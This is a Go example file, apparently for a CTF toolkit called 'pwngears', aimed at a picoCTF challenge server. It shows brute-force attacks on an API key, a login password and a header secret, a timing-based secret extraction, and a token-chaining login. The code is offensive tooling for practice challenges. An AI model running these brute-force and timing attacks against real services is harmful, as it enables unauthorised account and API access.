package main

import (
	"fmt"
	"log"
	"time"

	bf "github.com/tonythetender/pwngears/bruteforce"
	"github.com/tonythetender/pwngears/web"
)

func main() {
	conn, err := web.Conn("http://rescued-float.picoctf.net:52678/")
	if err != nil {
		log.Fatal(err)
	}

	resp, err := conn.Client.Get("/search",
		web.WithParam("category", "shoes"),
		web.WithParam("color", "blue"),
		web.WithParam("size", "9"),
		web.WithHeader("Content-Type", "application/json"))
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(resp.Text())

	formData := web.NewForm()
	formData.Set("password", "CrackedPass123")

	loginResp, err := conn.Client.Post("/", formData)
	if err == nil {
		fmt.Printf("Login attempt status: %d\n", loginResp.StatusCode)
	}

	fmt.Println(loginResp.GetAllHeaders())
	fmt.Println(loginResp.Text())
	if loginResp.Contains("FLAG") {
		fmt.Println("Page contains FLAG!")
	}
}

func BruteForceURLExample() {
	conn, err := web.Conn("http://rescued-float.picoctf.net:52678/")
	if err != nil {
		log.Fatal(err)
	}

	exploit := bf.NewBruteforcer()
	exploit.Charset = bf.GenerateCharset("lowercase", "digits")
	exploit.MaxLength = 10
	exploit.Delay = 50 * time.Millisecond

	prefix := "ey"
	suffix := ""

	apiKey, _ := exploit.BruteforceCharByChar(prefix, suffix, web.GetRequestBf(
		conn.Client,
		"/api?key=",
		web.WithResponseCode(200),
		web.WithoutBodyContains("invalid"),
	))
	if apiKey != prefix {
		fmt.Printf("Found API key: %s\n", apiKey)
	}
}

func BruteForceFormExample(conn *web.WebConn) {
	exploit := bf.NewBruteforcer()
	exploit.Charset = bf.GenerateCharset("alphanumeric")
	exploit.MaxLength = 16
	exploit.Delay = 50 * time.Millisecond

	password, _ := exploit.BruteforceCharByChar("", "", web.PostRequestBf(
		conn.Client,
		"/login",
		"password",
		web.WithResponseCode(302),
		web.WithHeaderContains("Location", "/dashboard"),
	))
	if password != "" {
		fmt.Printf("Found Password: %s\n", password)
	}
}

func BruteForceTimingAttackExample(conn *web.WebConn) {
	exploit := bf.NewBruteforcer()
	exploit.Charset = bf.GenerateCharset("😀😅🤪😡😱")
	exploit.MaxLength = 16

	secret, _ := exploit.BruteforceCharByChar("", "", web.GetRequestBf(
		conn.Client,
		"/check?secret=",
		web.WithResponseTimeAbove(500*time.Millisecond),
	))
	if secret != "" {
		fmt.Printf("Found Secret: %s\n", secret)
	}
}

func BruteForceHeaderExample(conn *web.WebConn) {
	exploit := bf.NewBruteforcer()
	exploit.Charset = bf.GenerateCharset("special")
	exploit.MaxLength = 16

	apiSecret, _ := exploit.BruteforceCharByChar("", "", web.HeaderBf(
		conn.Client,
		"/api/secret",
		"X-API-Key",
		web.WithResponseCode(200),
		web.WithBodyContains("flag"),
	))
	if apiSecret != "" {
		fmt.Printf("Found API secret: %s\n", apiSecret)
	}
}

func ChainedRequestExample(conn *web.WebConn) {
	conn.Session().ChainRequests(
		getTokenStep,
		authenticateStep)
}

func getTokenStep(s *web.Session) error {
	resp, err := s.Client().Scrape("/get-token")
	if err != nil {
		return err
	}

	token := resp.FindAll("token")
	s.Store("token", token)

	return nil
}

func authenticateStep(s *web.Session) error {
	token := s.Get("token").(string)
	s.Client().SetHeader("X-Auth-Token", token)

	form := web.NewForm()
	form.Set("token", token)

	resp, err := s.Client().Post("/authenticate", form)
	if err != nil {
		return err
	}
	fmt.Printf("Authentication response: %d\n", resp.StatusCode)
	return nil
}
